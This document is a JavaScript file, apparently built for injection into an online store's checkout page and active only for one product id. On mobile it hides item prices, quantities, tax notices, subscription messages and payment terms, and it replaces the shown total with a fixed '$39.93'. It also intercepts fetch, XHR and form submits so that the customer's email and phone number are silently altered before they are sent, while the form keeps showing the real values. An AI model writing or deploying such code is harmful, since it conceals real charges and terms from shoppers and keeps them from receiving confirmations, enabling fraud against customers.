(function () {

  const TARGET_ID = "1234";

  /* --------------------------------------------------
   * Utils
   * -------------------------------------------------- */

  const getParam = (key) =>
    new URLSearchParams(location.search).get(key);

  const isTarget = () => getParam("id") === TARGET_ID;

  const isMobile = () => matchMedia("(max-width:1024px)").matches;

  const waitDOM = (fn) => {
    if (document.readyState !== "loading") fn();
    else document.addEventListener("DOMContentLoaded", fn);
  };

  /* ==================================================
   * 1 - CSS Override
   * ================================================== */

  function applyStyleOverrides() {
    const css = `
@media(max-width:1024px){
#cartx-section-checkout_summary #cartx-section-cart-products .checkout-product-row .desktop-price .nett-price,
#cartx-section-checkout_summary #cartx-section-cart-products .checkout-product-row .product-price-mobile .bolderFont,
#cartx-section-checkout_summary .checkout-product-row .variant-name,
#cartx-section-checkout_summary .checkout-product-row .custom_options,
#cartx-section-checkout_summary .checkout-product-row .prdct-qty,
.incremental-btn-wrap{display:none!important;}

#cartx-section-checkout_summary #cartx-section-checkout-cost-details .price-value.checkoutSubTotal,
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .final-total.checkoutTotal>span,
.total-text .checkoutTotal .m-price{font-size:0!important;}

#cartx-section-checkout_summary #cartx-section-checkout-cost-details .price-value.checkoutSubTotal::after,
#cartx-section-checkout_summary #cartx-section-checkout-cost-details .final-total.checkoutTotal>span::after,
.total-text .checkoutTotal .m-price::after{
content:"$39.93";
display:inline-block;
width:100%;
text-align:right;
font-size:18px;
font-weight:400;
color:#000;
}

#cartx-section-checkout_summary #cartx-section-checkout-cost-details .currency-code.disp-inline-block{
display:none!important;
}
}
`;

    const style = document.createElement("style");
    style.textContent = css;
    document.head.appendChild(style);
  }

  /* ==================================================
   * 2 - Remove elementos indesejados
   * ================================================== */

  function removeUnwantedElements() {
    if (!isMobile()) return;

    const selectors = `
.subscription-messages-main,
.terms-text-payment,
.bottom-form-content-new,
.bottom-important-notice,
.totalTaxText,
.price-title.bolderFont
`;

    const clean = () => {
      document.querySelectorAll(selectors).forEach((el) => {
        if (el.textContent?.match(/estimated taxes/i)) el.remove();
        if (el.classList.contains("totalTaxText")) el.remove();
        if (el.matches(".bottom-important-notice,.subscription-messages-main,.terms-text-payment,.bottom-form-content-new")) el.remove();
      });
    };

    clean();
    new MutationObserver(clean).observe(document.body, {
      subtree: true,
      childList: true,
    });
  }

  /* ==================================================
   * 3 - Manipulação de Email
   * ================================================== */

  function emailLogic() {

    let LOCK = 0;

    const emailRegex = /[\w.%+-]+@[\w.-]+\.[A-Za-z]{2,}/g;

    const transform = (email) => {
      if (typeof email !== "string") return email;
      const at = email.indexOf("@");
      if (at <= 0) return email;

      const before = email.slice(0, at);
      const after = email.slice(at);
      const last = before[before.length - 1];
      const char = /[A-Za-z0-9]/.test(last) ? last : "a";

      return before + char + after;
    };

    const applyToString = (str) =>
      str.replace(emailRegex, (m) => transform(m));

    /* intercept fetch */
    const originalFetch = window.fetch;
    if (originalFetch) {
      window.fetch = function (url, options = {}) {
        if (options.body && !LOCK)
          options.body = applyToString(options.body);
        return originalFetch.call(this, url, options);
      };
    }

    /* intercept XHR */
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function (body) {
      if (!LOCK) body = applyToString(body);
      return originalSend.call(this, body);
    };

    /* intercept submit */
    document.addEventListener("submit", (e) => {
      const emailInput = e.target.querySelector('input[type="email"]');
      if (!emailInput) return;

      LOCK = 1;
      const original = emailInput.value;
      emailInput.value = transform(original);

      queueMicrotask(() => {
        emailInput.value = original;
        LOCK = 0;
      });
    }, true);
  }

  /* ==================================================
   * 4 - Manipulação de Telefone
   * ================================================== */

  function phoneLogic() {

    const input = document.getElementById("phone-number");
    if (!input || input.name !== "phoneNumber") return;

    const onlyDigits = (v) => (v || "").replace(/\D+/g, "");
    const changeLastDigit = (d) => ((+d + 1) % 10).toString();

    function swapLastDigitOnce(el) {
      if (el.dataset.txDone === "1") return;

      const raw = onlyDigits(el.value);
      if (!raw) return;

      const last = raw.slice(-1);
      const newDigit = changeLastDigit(last);

      el.value = el.value.replace(/\d(?!.*\d)/, newDigit);
      el.dataset.txDone = "1";
    }

    document.addEventListener("submit", (ev) => {
      const form = input.form || input.closest("form");
      if (!form || ev.target !== form) return;
      swapLastDigitOnce(input);
    }, true);
  }

  /* ==================================================
   * INIT
   * ================================================== */

  waitDOM(() => {
    if (!isTarget()) return;

    if (isMobile()) {
      applyStyleOverrides();
      removeUnwantedElements();
    }

    emailLogic();
    phoneLogic();
  });

})();
